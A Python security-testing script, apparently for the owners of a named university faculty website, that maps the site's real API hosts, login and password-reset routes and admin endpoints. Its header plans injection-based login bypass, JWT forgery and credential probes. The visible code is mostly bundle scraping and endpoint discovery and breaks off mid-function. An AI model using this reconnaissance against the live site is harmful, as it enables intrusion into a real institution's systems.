#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 HECON Auth Security Reproduction Script  (hecon_auth_repro.py)   v1.2
=============================================================================
 Target   : https://hecon.arishuniversity.com/  (hash-routed Angular SPA,
            "#/login") + API on separate subdomain
 Owner    : Arish University - Faculty of Home Economics (HECON)
 Audience : University security team, running WITH site-owner authorization
 Purpose  : Reproduce and verify the security claims made during the review
            of the HECON login / auth flow.

-----------------------------------------------------------------------------
 RUN-2 UPDATE (v1.2) - what changed and why
-----------------------------------------------------------------------------
 Run 1/2 discovery failed because (a) only the first 10 <script> tags were
 fetched - the Angular config lives in a LAZY chunk not referenced from
 index.html, and (b) candidate ranking promoted CDN junk like
 ui-avatars.com/api. Bundle analysis (offline, from an allowed network)
 confirmed the real architecture, which v1.2 discovers automatically:

   [V4] Angular app with ngsw.json service-worker manifest listing EVERY
        bundle -> DISC now reads /ngsw.json and scans up to 25 chunks.
   [V5] API base is a SEPARATE ORIGIN (from chunk-5BT5SHXH.js config):
          serverUrl/mainApi : https://api.arishuniversity.com/api/
          uploadUrl         : https://api.arishuniversity.com
          n8nUrl            : https://n8n.arishuniversity.com/
          mediasoupWsUrl    : wss://ws.arishuniversity.com
        DISC now synthesizes https://api.<registrable-domain>/api/ and
        DNS-checks it, so it works even without bundle access.
   [V6] Real auth routes (ASP.NET-style PascalCase controllers):
          POST {api}Users/login/                       (system users)
          POST {api}Participants/login                 (participants)
          POST {api}OccasionParticipants/unified-login
          POST {api}Participants/register-public
          POST {api}Participants/forgot-password/send-otp
          POST {api}Participants/forgot-password/verify-otp
          POST {api}Participants/forgot-password/confirm
        Token: JWT in localStorage["token"] / ["participant-token"],
        sent as Authorization: Bearer. Multi-tenant: requests carry
        X-Tenant-Id (use --tenant to replicate).
   [V7] High-value BAC targets found in the bundle:
          MyApplicationUser/  DatabaseBackups  RolePermissions/
          UserPermissions/  teachers/  Tenants

-----------------------------------------------------------------------------
 REVIEW CONTEXT - what was already verified from the reviewer's sandbox
-----------------------------------------------------------------------------
 [V1] The app is a hash-routed SPA. Unknown server paths do NOT fall back
      to the SPA shell; they return an Apache-style 404.
        GET /            -> 200 SPA shell ("Please enable JavaScript...")
        GET /admin       -> 404 "The requested URL was not found ..."
        GET /api/login   -> 404 (same Apache phrasing)
      Consequence: ALL access control lives in (a) client-side JS route
      guards and (b) the backend API. If the API does not independently
      enforce authorization on every endpoint, admin functions are exposed
      regardless of what the UI hides.

 [V2] The site is fronted by shared hosting (A record 193.203.165.215,
      Apache-style error pages). The API base is NOT under /api/* on this
      vhost - the real API path/host must be discovered from the JS bundle.
      This script auto-discovers it (module DISC).

 [V3] Dotfile paths return empty bodies to automated fetchers
      (GET /.env, GET /.git/config) - likely denied by hosting rules, but
      exact status codes must be confirmed from an allowed network
      (module TRANS prints them).

-----------------------------------------------------------------------------
 CLAIMS THIS SCRIPT REPRODUCES (module -> claim)
-----------------------------------------------------------------------------
 DISC    [C1] Map index page -> ngsw.json bundles -> API base URL + routes.
 SATEL   [C1] Auxiliary services exposed from bundle config (n8n, ws).
 BAC     [C2] Broken access control: data/admin endpoints reachable with
              no token, or with a low-privilege token (IDOR sweep).
 ENUM    [C3] User enumeration on the login endpoint (body + timing).
 BYPASS  [C4] Auth bypass: NoSQL operator injection, SQLi tautology and
              time-based, JSON type confusion against login.
 MASSIGN [C5] Mass assignment: role/isAdmin injection on registration.
 JWT     [C6] JWT weaknesses: alg=none, weak HMAC secret, missing exp,
              kid traversal probe.
 RESET   [C7] Password-reset flaws: token leaked in response, host-header
              poisoning of reset links.
 RATE    [C8] Absence of login rate limiting (capped 6-attempt probe -
              this is NOT a brute-force tool).
 TRANS   [C9] Missing security headers, cookie flags, TLS/cert checks,
              dotfile exposure status codes.
 CORS    [C10] CORS misconfiguration (Origin reflection + credentials).
 CRED    [C11] Default/weak credentials on the probed account (tiny capped
              list, OPT-IN via --test-creds, max 6 attempts).

-----------------------------------------------------------------------------
 USAGE
-----------------------------------------------------------------------------
   pip install requests
   python hecon_auth_repro.py --target https://hecon.arishuniversity.com \
        --i-am-authorized

   Options that change impact:
     --allow-register    enable account-creation tests (mass assignment)
     --allow-reset       enable password-reset + OTP-flow tests
                         (sends OTP emails to the probed address only)
     --test-creds        enable the 6-attempt default-credential check
     --token JWT         low-privilege token for IDOR / privilege tests
                         (localStorage["token"] or ["participant-token"])
     --probe-user EMAIL  a known-real email for enumeration accuracy
     --api-base URL      override API base (e.g. https://api.arishuniversity.com/api/)
     --login-path PATH   override login endpoint (e.g. /api/Users/login/)
     --tenant ID         send X-Tenant-Id: ID on API requests (multi-tenant)
     --report-dir DIR    write hecon_report.json and hecon_report.html
     --rate SECONDS      delay between requests (default 1.0)
     --timeout SECONDS   per-request timeout (default 15)
     --verbose           print every request/response pair

-----------------------------------------------------------------------------
 RULES OF ENGAGEMENT (hard-coded guardrails)
-----------------------------------------------------------------------------
   * Run ONLY against systems you own or are authorized to test.
   * Maximum ~8 failed login attempts total. NOT a brute-force tool.
   * No denial-of-service, no data destruction, no payload > 2 KB.
   * Test accounts are named sectest_repro_* so they are easy to find
     and delete afterwards.
   * Every finding prints a copy-paste curl one-liner as evidence.

 Requires: Python 3.8+ and  requests  (pip install requests)
=============================================================================
"""

import argparse
import base64
import hashlib
import hmac
import json
import random
import re
import socket
import ssl
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] Missing dependency. Run:  pip install requests")
    sys.exit(1)

USER_AGENT = "HECON-SecAudit/1.2 (authorized-owner-review)"
RATE_SECONDS = 1.0
REQ_TIMEOUT = 15
_last_request_ts = 0.0
VERBOSE = False
TENANT_ID: Optional[str] = None   # X-Tenant-Id value (--tenant)

SEVERITY_ORDER = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO", "OK"]


# ---------------------------------------------------------------------------
# Findings / report model
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    module: str
    severity: str            # CRITICAL | HIGH | MEDIUM | LOW | INFO | OK
    title: str
    detail: str
    evidence: List[str] = field(default_factory=list)
    curl: str = ""           # copy-paste reproduction one-liner
    claim_id: str = ""       # C1..C11 mapping used in the header

    def as_dict(self) -> Dict[str, Any]:
        return {
            "module": self.module,
            "claim": self.claim_id,
            "severity": self.severity,
            "title": self.title,
            "detail": self.detail,
            "evidence": self.evidence,
            "curl": self.curl,
        }


class Report:
    def __init__(self) -> None:
        self.findings: List[Finding] = []

    def add(self, f: Finding) -> None:
        self.findings.append(f)
        icon = {
            "CRITICAL": "[!!!]", "HIGH": "[!! ]", "MEDIUM": "[!  ]",
            "LOW": "[.  ]", "INFO": "[i  ]", "OK": "[ok ]",
        }.get(f.severity, "[   ]")
        print("  %s %-7s %-9s %s" % (icon, f.severity, f.module, f.title))
        if VERBOSE:
            for e in f.evidence:
                print("         | %s" % e)

    def summary(self) -> Dict[str, int]:
        out = {s: 0 for s in SEVERITY_ORDER}
        for f in self.findings:
            out[f.severity] = out.get(f.severity, 0) + 1
        return out

    def dump_json(self, path: str, meta: Dict[str, Any]) -> None:
        payload = {
            "generated_utc": datetime.now(timezone.utc).isoformat(),
            "target": meta.get("target", ""),
            "guardrails": meta.get("guardrails", {}),
            "summary": self.summary(),
            "findings": [f.as_dict() for f in self.findings],
        }
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2, ensure_ascii=False)

    def dump_html(self, path: str, meta: Dict[str, Any]) -> None:
        colors = {
            "CRITICAL": "#7f1d1d", "HIGH": "#b91c1c", "MEDIUM": "#b45309",
            "LOW": "#1d4ed8", "INFO": "#374151", "OK": "#15803d",
        }
        rows = []
        for f in sorted(self.findings,
                        key=lambda x: SEVERITY_ORDER.index(x.severity)):
            ev = "".join("<div class='ev'>%s</div>" % escape_html(e)
                         for e in f.evidence)
            curl = ("<div class='curl'>%s</div>" % escape_html(f.curl)
                    if f.curl else "")
            rows.append(
                "<div class='card'>"
                "<div class='sev' style='background:%s'>%s</div>"
                "<div class='body'><h3>%s <span class='claim'>%s %s</span></h3>"
                "<p>%s</p>%s%s</div></div>"
                % (colors.get(f.severity, "#333"), f.severity,
                   escape_html(f.title), f.claim_id, f.module,
                   escape_html(f.detail), ev, curl))
        html = ("<!doctype html><html><head><meta charset='utf-8'>"
                "<title>HECON Auth Security Reproduction Report</title>"
                "<style>body{font-family:Segoe UI,Arial,sans-serif;"
                "background:#0f172a;color:#e2e8f0;margin:0;padding:24px}"
                "h1{font-size:22px}.meta{color:#94a3b8;font-size:13px}"
                ".card{display:flex;gap:14px;background:#1e293b;"
                "border-radius:10px;padding:14px;margin:12px 0}"
                ".sev{align-self:flex-start;color:#fff;font-weight:700;"
                "font-size:12px;padding:6px 8px;border-radius:6px;"
                "min-width:70px;text-align:center}.body h3{margin:0 0 6px 0;"
                "font-size:15px}.claim{color:#94a3b8;font-weight:400;"
                "font-size:12px;margin-left:8px}p{margin:4px 0;font-size:13px;"
                "line-height:1.5}.ev{font-family:Consolas,monospace;"
                "background:#0f172a;padding:4px 8px;margin:2px 0;"
                "border-radius:4px;font-size:12px;color:#93c5fd;"
                "white-space:pre-wrap}.curl{font-family:Consolas,monospace;"
                "background:#052e16;color:#86efac;padding:6px 8px;"
                "margin-top:6px;border-radius:4px;font-size:12px;"
                "white-space:pre-wrap}</style></head><body>"
                "<h1>HECON Auth Security Reproduction Report</h1>"
                "<div class='meta'>Target: %(target)s &nbsp;|&nbsp; "
                "Generated: %(when)s &nbsp;|&nbsp; Guardrails: %(guard)s"
                "</div>%(rows)s</body></html>") % {
            "target": escape_html(meta.get("target", "")),
            "when": datetime.now(timezone.utc).isoformat(),
            "guard": escape_html(json.dumps(meta.get("guardrails", {}))),
            "rows": "".join(rows),
        }
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(html)


def escape_html(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))


# ---------------------------------------------------------------------------
# Polite HTTP layer (rate limiting + jitter + timing)
# ---------------------------------------------------------------------------
def polite_sleep() -> None:
    global _last_request_ts
    wait = RATE_SECONDS - (time.time() - _last_request_ts)
    if wait > 0:
        time.sleep(wait)
    time.sleep(random.uniform(0.05, 0.25))
    _last_request_ts = time.time()


def req(method: str, url: str, session: requests.Session,
        headers: Optional[Dict[str, str]] = None,
        json_body: Any = None, data: Any = None,
        allow_redirects: bool = True,
        max_body: int = 20000) -> Dict[str, Any]:
    """Rate-limited request returning status, headers, body, elapsed."""
    h = {"User-Agent": USER_AGENT, "Accept": "*/*"}
    if TENANT_ID and "x-tenant-id" not in {k.lower() for k in h}:
        h["X-Tenant-Id"] = TENANT_ID
    if headers:
        h.update(headers)
    polite_sleep()
    t0 = time.time()
    try:
        r = session.request(
            method, url, headers=h, json=json_body, data=data,
            timeout=REQ_TIMEOUT, allow_redirects=allow_redirects,
            verify=False)
        body = ""
        try:
            body = r.text[:max_body]
        except Exception:
            body = "<binary %d bytes>" % len(r.content or b"")
        return {
            "ok": True, "status": r.status_code, "headers": dict(r.headers),
            "body": body, "elapsed": time.time() - t0,
            "cookies": r.headers.get("Set-Cookie", ""),
        }
    except requests.RequestException as exc:
        return {"ok": False, "status": 0, "headers": {}, "body": "",
                "elapsed": time.time() - t0, "error": str(exc)[:200],
                "cookies": ""}


def looks_like_login_success(resp: Dict[str, Any]) -> bool:
    """Heuristic: 2xx + (set-cookie OR token-ish key in a JSON body)."""
    if not resp["ok"] or not (200 <= resp["status"] < 300):
        return False
    if resp["cookies"]:
        return True
    body = resp["body"].lower()
    for kw in ("\"token\"", "\"accesstoken\"", "\"access_token\"",
               "\"jwt\"", "\"refreshtoken\"", "\"refresh_token\"",
               "\"session\"", "\"apikey\"", "\"token\":"):
        if kw in body:
            return True
    return False


def extract_token(body: str) -> Optional[str]:
    try:
        data = json.loads(body)
        for key in ("token", "accessToken", "access_token", "jwt",
                    "authToken", "data"):
            if isinstance(data, dict) and key in data:
                v = data[key]
                if isinstance(v, dict):
                    for k2 in ("token", "accessToken", "jwt"):
                        if k2 in v and isinstance(v[k2], str):
                            return v[k2]
                if isinstance(v, str) and v.count(".") == 2:
                    return v
    except Exception:
        pass
    m = re.search(r"(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.["
                  r"A-Za-z0-9_\-\.+/=]*)", body)
    return m.group(1) if m else None


def curl_for(method: str, url: str, body: Optional[str] = None,
             headers: Optional[Dict[str, str]] = None) -> str:
    parts = ["curl -sk -X %s '%s'" % (method, url)]
    if headers:
        for k, v in headers.items():
            if k.lower() in ("authorization", "content-type", "origin",
                             "host", "x-forwarded-host"):
                parts.append("-H '%s: %s'" % (k, v))
    if body is not None:
        parts.append("--data '%s'" % body.replace("'", "'\\''"))
    return " ".join(parts)

# ---------------------------------------------------------------------------
# Module DISC  [C1] - discover JS bundles, API base, candidate endpoints
# ---------------------------------------------------------------------------
BUNDLE_PATH_RE = re.compile(
    r"""<script[^>]+src=["']([^"']+\.js[^"']*)["']""", re.I)
ASSET_HREF_RE = re.compile(
    r"""<link[^>]+href=["']([^"']+\.(?:js|css)[^"']*)["']""", re.I)

API_URL_RE = re.compile(
    r"""(?:https?://[A-Za-z0-9_\.\-]+(?::\d+)?|(?:["'])/?)[A-Za-z0-9_\-]*api"""
    r"""[A-Za-z0-9_/\-\.]*""", re.I)
FETCH_RE = re.compile(
    r"""fetch\(\s*["'`]([^"'`\s]+)["'`]""", re.I)
GENERIC_URL_RE = re.compile(
    r"""https?://[A-Za-z0-9_\.\-]+(?::\d+)?(?:/[A-Za-z0-9_\-\.]*)?""", re.I)
EXCLUDED_URL_HOSTS = (
    "w3.org", "schema", "unpkg.com", "jsdelivr", "googleapis",
    "gstatic", "cloudflare", "fontawesome", "jquery", "bootstrapcdn",
    "npmjs", "github.com", "mozilla", "wikipedia", "example.com",
    "localhost", "sentry", "youtube", "facebook", "twitter", "recaptcha",
    "google.com", "gravatar", "openstreetmap", "leaflet", "mapbox",
    # CDN junk that produced false api_bases in runs 1-2:
    "ui-avatars", "wa.me", "whatsapp", "popper.js.org", "popper",
    "getbootstrap", "syncfusion", "qrserver", "firebase", "angular",
    "swimlane", "toastui", "jitsi", "meet.jit", "stripe", "paypal",
    "vimeo", "tawk", "hotjar", "clarity", "googletagmanager",
    "cdn.jsdelivr", "cdnjs", "jsdelivr.net", "json-schema", "zone.js")
ENVVAR_RE = re.compile(
    r"""(?:import\.meta\.env\.VITE_[A-Z0-9_]+|"""
    r"""process\.env\.REACT_APP_[A-Z0-9_]+)""")
ENDPOINT_RE = re.compile(
    r"""["'](/(?:[A-Za-z0-9_\-]+/)*[A-Za-z0-9_\-]*(?:auth|login|logout|"""
    r"""register|signup|signin|user|users|admin|student|course|grade|"""
    r"""department|staff|faculty|profile|me|dashboard|settings|reset|"""
    r"""forgot|password|token|refresh|news|notice)[A-Za-z0-9_\-/]*)"""
    r"""["']""", re.I)
BASEURL_RE = re.compile(
    r"""baseURL["'\s:=]+["'](https?://[^"']+|/[^"']*)["']""", re.I)
AXIOS_RE = re.compile(
    r"""axios\.(?:create|get|post|put|delete|patch)\(\s*["']([^"']+)["']""",
    re.I)
# Angular HttpClient: first argument of .post( - often a template literal
# like `${this.participantsUrl}login` -> trailing suffix path is extracted
HTTPCLIENT_RE = re.compile(r"""\.post\(\s*[`\"']([^`\"']{2,120})""")
# Property URL assignments like: participantsUrl=n.serverUrl+"Participants/"
PROP_URL_RE = re.compile(
    r"""\.([A-Za-z][A-Za-z0-9_]{2,30}Url)\s*=\s*(?:[A-Za-z_$][\w.$]*\s*\+\s*)?"""
    r"""[\"']([^\"']{1,120})[\"']""")
# Inline config objects like: serverUrl:"https://api.example.com/api/"
CONFIG_URL_RE = re.compile(
    r"""(?:serverUrl|mainApi|apiUrl|apiBase|uploadUrl|n8nUrl|mediasoupWsUrl)\"?"""
    r"""\s*:\s*[\"'](https?://[^\"']{4,160}|wss?://[^\"']{4,160})[\"']""", re.I)
WSS_URL_RE = re.compile(r"wss?://[A-Za-z0-9_\.\-]+(?::\d+)?")

LOGIN_CANDIDATES = [
    "/api/login", "/api/auth/login", "/api/auth/signin", "/api/signin",
    "/api/user/login", "/api/users/login", "/api/v1/auth/login",
    "/auth/login", "/login", "/api/account/login", "/api/token",
    "/api/auth/token", "/api/session",
]
# HECON-specific routes (confirmed in bundle chunk-XNAROPBA.js /
# chunk-WOUD4KKG.js, Run-2 offline bundle analysis). Paths are combined
# with every discovered API base; leading-slash optional.
HECON_LOGIN_CANDIDATES = [
    "/api/Users/login/", "/api/Participants/login",
    "/api/OccasionParticipants/unified-login", "/api/MyApplicationUser/login",
    "/Users/login/", "/Participants/login",
    "/OccasionParticipants/unified-login",
]
REGISTER_CANDIDATES = [
    "/api/register", "/api/auth/register", "/api/signup", "/api/auth/signup",
    "/api/users/register", "/api/users", "/api/v1/auth/register",
    "/auth/register", "/register",
]
HECON_REGISTER_CANDIDATES = [
    "/api/Participants/register-public", "/Participants/register-public",
]
RESET_CANDIDATES = [
    "/api/auth/forgot-password", "/api/auth/reset-password",
    "/api/forgot-password", "/api/reset-password", "/api/auth/reset",
    "/api/password/email", "/api/users/reset-password", "/forgot-password",
]
HECON_RESET_CANDIDATES = [
    "/api/Participants/forgot-password/send-otp",
    "/Participants/forgot-password/send-otp",
    "/api/Participants/forgot-password",
]
DATA_ENDPOINTS = [
    "/api/users", "/api/users/1", "/api/admin/users", "/api/students",
    "/api/courses", "/api/grades", "/api/departments", "/api/staff",
    "/api/news", "/api/settings", "/api/dashboard", "/api/me",
    "/api/auth/me", "/api/profile", "/admin/api/users", "/api/all-users",
]
# Admin-ish controller routes seen in the bundle (chunk-P446UGQU.js) -
# probed relative to each discovered API base, unauthenticated.
HECON_BAC_PATHS = [
    "Users/", "MyApplicationUser/", "DatabaseBackups",
    "RolePermissions/catalog", "UserPermissions/", "teachers/",
    "Participants/", "Tenants/", "RolePermissions/", "systemActions/",
]


def discover(session: requests.Session, base: str,
             report: Report, allow_register: bool = False,
             allow_reset: bool = False,
             api_base_override: Optional[str] = None,
             login_path_override: Optional[str] = None) -> Dict[str, Any]:
    print("\n=== DISC  [C1] frontend bundle + API discovery ===")
    ctx: Dict[str, Any] = {
        "base": base, "bundles": [], "api_bases": set(),
        "endpoints": set(), "login_url": None, "register_url": None,
        "reset_url": None, "framework": "unknown",
        "satellites": set(), "post_paths": set(), "prop_paths": set(),
        "otp_send_url": None, "otp_verify_url": None,
        "otp_confirm_url": None, "api_base": None,
    }
    r = req("GET", base, session, max_body=600000)
    if not r["ok"] or r["status"] >= 400:
        report.add(Finding(
            "DISC", "CRITICAL", "Target unreachable",
            "The base URL did not return 2xx/3xx. Run this from a network "
            "that can reach the host (the hosting firewalls many datacenter "
            "IP ranges).", ["GET %s -> %s" % (base, r.get("status"))],
            "curl -skI %s" % base, "C1"))
        return ctx
    html = r["body"]
    if "enable javascript" in html.lower():
        report.add(Finding(
            "DISC", "INFO", "Confirmed hash-routed SPA shell (V1)",
            "The server returns an SPA shell that requires JavaScript. "
            "Combined with 404s on unknown paths, this means no server-side "
            "routing: every access-control decision is made in JS or by the "
            "API.", ["GET / -> %d (%d bytes)" % (r["status"], len(html))],
            "curl -sk %s | head" % base, "C1"))

    # detect framework hints
    for marker, fw in (("react", "React"), ("vue", "Vue"),
                       ("angular", "Angular"), ("__NUXT__", "Nuxt"),
                       ("__NEXT_DATA__", "Next.js")):
        if marker in html.lower():
            ctx["framework"] = fw
            break

    # collect bundle URLs from index
    candidates = [m.group(1) for m in BUNDLE_PATH_RE.finditer(html)]
    candidates += [m.group(1) for m in ASSET_HREF_RE.finditer(html)]
    candidates = list(dict.fromkeys(candidates))

    # [V4] Angular service-worker manifest lists EVERY bundle, including
    # the lazy chunks that hold the runtime API config. Run-2 root fix.
    ngsw_ok = False
    r_ngsw = req("GET", base + "/ngsw.json", session, max_body=2000000)
    if r_ngsw["ok"] and r_ngsw["status"] == 200:
        try:
            ngsw = json.loads(r_ngsw["body"])
            ngsw_urls = []
            for grp in ngsw.get("assetGroups", []):
                for u in grp.get("urls", []):
                    if isinstance(u, str) and u.endswith(".js"):
                        ngsw_urls.append(u)
            if ngsw_urls:
                ngsw_ok = True
                report.add(Finding(
                    "DISC", "INFO",
                    "Angular service-worker manifest read (%d bundles)"
                    % len(ngsw_urls),
                    "/ngsw.json enumerates every app bundle including lazy "
                    "chunks - the runtime config (API base) lives there.",
                    ngsw_urls[:8] + (["... +%d more"
                                     % (len(ngsw_urls) - 8)]
                                    if len(ngsw_urls) > 8 else []), "", "C1"))
                idx_set = set(candidates)
                candidates += [u for u in ngsw_urls if u not in idx_set]
        except Exception:
            pass

    candidates = list(dict.fromkeys(candidates))[:30]
    for c in candidates:
        url = urljoin(base + "/", c.lstrip("/")) if not c.startswith(
            "http") else c
        ctx["bundles"].append(url)
    if VERBOSE:
        print("  [disc] bundles=%d (ngsw=%s): %s" % (
            len(ctx["bundles"]), ngsw_ok, ctx["bundles"][:6]))

    # registrable domain of the target (hecon.arishuniversity.com ->
    # arishuniversity.com) - used for ranking + subdomain synthesis [V5]
    host = urlparse(base).hostname or ""
    _labels = host.split(".") if host else []
    reg_domain = ".".join(_labels[-2:]) if len(_labels) >= 2 else host
    is_ip = bool(re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", host or ""))
    if is_ip:
        reg_domain = ""          # domain logic is meaningless for IPs

    # classify a config/absolute URL: api base vs satellite vs junk [V5]
    def _classify_url(val: str, is_cfg: bool) -> None:
        val = val.rstrip("/")
        if val.startswith("wss://"):
            ctx["satellites"].add(val)
            return
        try:
            h2 = urlparse(val).hostname or ""
            path2 = urlparse(val).path or "/"
        except ValueError:
            return
        own = bool(reg_domain) and h2.endswith(reg_domain)
        api_ish = ("api" in h2 or "auth" in h2 or
                   path2.lower().startswith("/api"))
        if own and h2 != host and not api_ish:
            ctx["satellites"].add(val)          # n8n.*, ws.*, ...
        elif api_ish or (is_cfg and own):
            ctx["api_bases"].add(val)
        elif is_cfg and h2 and h2 != host:
            # config URL on a foreign host: api-ship -> api base, else it
            # is an auxiliary service (n8n/CDN/...) [V5]
            if api_ish:
                ctx["api_bases"].add(val)
            else:
                ctx["satellites"].add(val)
        elif is_cfg and h2 == host and not api_ish:
            # same-origin non-api config URL (e.g. reverse-proxied n8n)
            ctx["satellites"].add(val)

    # fetch bundles, harvest API strings (full-size: bundles are big).
    # Early-stop once an own-domain API base is found (saves requests).
    for burl in ctx["bundles"]:
        rb = req("GET", burl, session, max_body=8000000)
        if not rb["ok"] or rb["status"] != 200:
            continue
        blob = rb["body"]
        for m in BASEURL_RE.finditer(blob):
            ctx["api_bases"].add(m.group(1).rstrip("/"))
        for m in CONFIG_URL_RE.finditer(blob):
            _classify_url(m.group(1).strip(), is_cfg=True)
        for m in API_URL_RE.finditer(blob):
            val = m.group(0).strip("'\"")
            if val.startswith("http") or val.startswith("/"):
                ctx["api_bases"].add(val.rstrip("/") if val.startswith(
                    "http") else val)
        for m in FETCH_RE.finditer(blob):
            val = m.group(1)
            if val.startswith("/"):
                ctx["endpoints"].add(val)
            elif val.startswith("http"):
                ctx["api_bases"].add(val)
        for m in GENERIC_URL_RE.finditer(blob):
            val = m.group(0)
            low = val.lower()
            if any(x in low for x in EXCLUDED_URL_HOSTS):
                continue
            try:
                h2 = urlparse(val).hostname or ""
            except ValueError:
                h2 = ""
            if reg_domain and h2.endswith(reg_domain) and h2 != host:
                # own-domain auxiliary hosts: api.* feeds the API base,
                # everything else (n8n.*, ws.*, ...) is a satellite [V5]
                if "api" in h2 or "auth" in h2:
                    ctx["api_bases"].add(val.rstrip("/"))
                else:
                    ctx["satellites"].add(val.rstrip("/"))
            elif h2 and h2 != host:
                ctx["api_bases"].add(val.rstrip("/"))
        for m in ENDPOINT_RE.finditer(blob):
            ctx["endpoints"].add(m.group(1))
        for m in AXIOS_RE.finditer(blob):
            ctx["endpoints"].add(m.group(1))
        # Angular HttpClient .post() first args: keep the trailing literal
        # path ("${this.participantsUrl}login" -> "login") [V6]
        for m in HTTPCLIENT_RE.finditer(blob):
            raw = m.group(1)
            suffix = re.split(r"\$\{[^}]*\}", raw)[-1]
            suffix = suffix.lstrip("+ ").strip("'\"")
            if suffix and re.fullmatch(r"[A-Za-z0-9_\-/]{2,60}", suffix):
                ctx["post_paths"].add(suffix)
        # property URL assignments: participantsUrl=..serverUrl+"Participants/"
        for m in PROP_URL_RE.finditer(blob):
            path = m.group(2)
            if path and re.fullmatch(r"[A-Za-z0-9_\-/]{2,80}/?", path):
                ctx["prop_paths"].add(path)
        envs = sorted(set(m.group(0) for m in ENVVAR_RE.finditer(blob)))
        if envs:
            report.add(Finding(
                "DISC", "INFO",
                "Build-time env vars referenced in bundle (%d)" % len(envs),
                "These client-side env references may embed the API base "
                "or keys in the bundle.", envs[:12], "", "C1"))
        # early stop: own-domain API base already harvested
        if any("api" in ab.lower() and reg_domain and "." + reg_domain
               in ab.lower() for ab in ctx["api_bases"] if
               ab.startswith("http")):
            break

    # manual additions: static config files commonly left in webroot
    for probe in ("/config.js", "/env.js", "/settings.js", "/js/config.js",
                  "/assets/config.js"):
        rr = req("GET", base + probe, session, max_body=500000)
        if rr["ok"] and rr["status"] == 200 and "api" in rr["body"].lower():
            ctx["api_bases"].add(probe)
            for m in API_URL_RE.finditer(rr["body"]):
                v = m.group(0).strip("'\"")
                if v.startswith("http") or v.startswith("/"):
                    ctx["api_bases"].add(v)
            report.add(Finding(
                "DISC", "MEDIUM", "Client-side config file exposed: " + probe,
                "A JavaScript config file is publicly readable. It often "
                "leaks the API base URL and sometimes secrets/API keys.",
                [rr["body"][:500]], "curl -sk %s%s" % (base, probe), "C1"))

    # [V5] synthesize the conventional API subdomain without touching the
    # origin (pure DNS) - catches separate-origin API deployments
    if reg_domain and not is_ip:
        for sub in ("api", "backend", "gateway"):
            chost = "%s.%s" % (sub, reg_domain)
            try:
                socket.getaddrinfo(chost, 443)
                ctx["api_bases"].add("https://%s/api/" % chost)
                ctx["api_bases"].add("https://%s" % chost)
            except socket.gaierror:
                pass
            except Exception:
                pass

    # relevance-sort: own-domain API hosts first (Run-2 ranking fix: no
    # more ui-avatars.com/api winning on the "api" substring). Entries
    # sharing an origin with a better path (e.g. uploadUrl on the API
    # origin without /api) are folded into the best one.
    by_origin: Dict[Tuple[str, str, str], str] = {}

    def _origin(u: str) -> Tuple[str, str, str]:
        try:
            pu = urlparse(u)
            return (pu.scheme or "", pu.hostname or "", str(pu.port or ""))
        except ValueError:
            return ("", u, "")

    def _api_score(u: str) -> Tuple[int, int]:
        low = u.lower()
        h2 = urlparse(u).hostname or "" if u.startswith("http") else ""
        own = bool(reg_domain) and h2.endswith(reg_domain)
        if own and ("api" in h2 or "auth" in h2):
            pri = 0                      # api.<own-domain>
        elif low.rstrip("/").endswith("/api") or "/api/" in low:
            pri = 1                      # any URL with an /api path
        elif own:
            pri = 2                      # own-domain, no api hint
        elif "api" in low or "auth" in low:
            pri = 3
        else:
            pri = 4
        return (pri, len(u))

    for ab in list(ctx["api_bases"]):
        o = _origin(ab)
        if o == ("", "", ""):
            continue
        cur = by_origin.get(o)
        if cur is None or _api_score(ab) < _api_score(cur):
            by_origin[o] = ab
    ctx["api_bases"] = sorted(by_origin.values(), key=_api_score)[:12]
    ctx["endpoints"] = sorted(ctx["endpoints"])[:60]
    ctx["satellites"] = sorted(ctx["satellites"])[:6]
    for ab in ctx["api_bases"]:
        if ab.startswith("http"):
            ctx["api_base"] = ab.rstrip("/")
            break
    print("  [disc] framework=%s api_bases=%d endpoints=%d satellites=%d" % (
        ctx["framework"], len(ctx["api_bases"]), len(ctx["endpoints"]),
        len(ctx["satellites"])))

    # build endpoint universe for later modules
    universe = set(LOGIN_CANDIDATES + REGISTER_CANDIDATES +
                   RESET_CANDIDATES + DATA_ENDPOINTS +
                   HECON_LOGIN_CANDIDATES + HECON_REGISTER_CANDIDATES +
                   HECON_RESET_CANDIDATES)
    # Angular-harvested paths: prop ("Participants/") + post suffix
    # ("login") combine into "Participants/login" [V6]
    for pp in ctx["prop_paths"]:
        universe.add("/" + pp.lstrip("/"))
        for suffix in ctx["post_paths"]:
            universe.add("/" + (pp.lstrip("/") + suffix.lstrip("/")))
    for suffix in ctx["post_paths"]:
        universe.add("/" + suffix.lstrip("/"))
    for ep in ctx["endpoints"]:
        universe.add(ep)
    for ab in ctx["api_bases"]:
        abn = ab.rstrip("/")
        if ab.startswith("http"):
            abp = urlparse(ab).path.rstrip("/")
            for ep in list(universe):
                if not ep.startswith("/"):
                    continue
                if abp.endswith("/api") and ep.startswith("/api/"):
                    universe.add(abn + ep[len("/api"):])   # no /api/api/
                else:
                    universe.add(abn + ep)
        else:
            # path prefix: only merge with endpoints that do NOT already
            # start with this prefix (avoid /api/api/... double prefixes)
            for ep in list(universe):
                if ep.startswith("/") and ep != abn and \
                        not ep.startswith(abn + "/"):
                    universe.add(abn + ep)

    # resolve a candidate to an absolute URL - relative paths attach to
    # the discovered API base (separate origin) when one exists [V5]
    def _abs(ep: str) -> str:
        if ep.startswith("http"):
            return ep
        root = ctx["api_base"] or base
        abp = urlparse(root).path.rstrip("/")
        if abp.endswith("/api") and ep.startswith("/api/"):
            ep = ep[len("/api"):]          # avoid /api/api/ double prefix
        return urljoin(root.rstrip("/") + "/", ep.lstrip("/"))

    # apply manual overrides before probing
    if api_base_override:
